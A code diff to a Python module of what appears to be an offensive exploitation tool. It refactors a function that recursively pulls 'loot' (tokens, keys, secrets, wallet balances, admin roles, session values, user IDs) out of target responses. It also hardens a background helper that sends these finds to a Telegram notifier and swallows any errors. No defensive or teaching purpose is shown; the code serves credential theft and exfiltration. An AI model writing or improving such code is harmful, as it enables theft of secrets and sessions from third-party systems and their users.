@@ -6,6 +6,7 @@ import asyncio
 import json
 import re
 import sys
+
 from modules.telegram_notifier import send_telegram_alert
 
 CYAN = "\033[96m"
@@ -33,7 +34,20 @@ CHALLENGE_SIGNATURES = [
     r'<meta\s+name=["\']robots["\']\s+content=["\']noindex,\s*nofollow["\']',
 ]
 
+LOOT_KEY_MARKERS = (
+    "token",
+    "key",
+    "secret",
+    "balance",
+    "wallet",
+    "admin",
+    "role",
+    "session",
+    "user_id",
+)
+
 _CHALLENGE_REGEX = re.compile("|".join(CHALLENGE_SIGNATURES), re.IGNORECASE)
+_background_tasks: set[asyncio.Task] = set()
 
 
 def _extract_text_from_proof(proof_data) -> str:
@@ -77,19 +91,42 @@ def is_challenge_or_false_positive(exploit_type, response_body="", proof_data=No
     return False, ""
 
 
+async def _send_alert_safe(loot_type, details):
+    try:
+        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
+    except Exception:
+        pass
+
+
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous telemetry streams."""
+    """Non-blockingly fires Telegram alerts from synchronous telemetry streams."""
     try:
         loop = asyncio.get_running_loop()
-        if loop.is_running():
-            loop.create_task(send_telegram_alert(loot_type, details))
-        else:
-            asyncio.run(send_telegram_alert(loot_type, details))
+        if not loop.is_closed():
+            task = loop.create_task(_send_alert_safe(loot_type, details))
+            _background_tasks.add(task)
+            task.add_done_callback(_background_tasks.discard)
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(_send_alert_safe(loot_type, details))
         except Exception:
             pass
+
+
+def _collect_loot_keys(node, out: dict, depth: int = 0) -> None:
+    if depth > 3 or len(out) >= 25:
+        return
+    if isinstance(node, dict):
+        for k, v in node.items():
+            k_str = str(k)
+            if any(sub in k_str.lower() for sub in LOOT_KEY_MARKERS) and k_str not in out:
+                out[k_str] = v
+            if isinstance(v, (dict, list)):
+                _collect_loot_keys(v, out, depth + 1)
+    elif isinstance(node, list):
+        for item in node[:10]:
+            if isinstance(item, (dict, list)):
+                _collect_loot_keys(item, out, depth + 1)
 
 
 def extract_valuable_loot(response_body):
@@ -104,13 +141,7 @@ def extract_valuable_loot(response_body):
 
     try:
         data = json.loads(response_body)
-        if isinstance(data, dict):
-            for k, v in data.items():
-                if any(
-                    sub in str(k).lower()
-                    for sub in ["token", "key", "secret", "balance", "wallet", "admin", "role", "session", "user_id"]
-                ):
-                    looted_assets[k] = v
+        _collect_loot_keys(data, looted_assets, depth=0)
     except Exception:
         pass
 
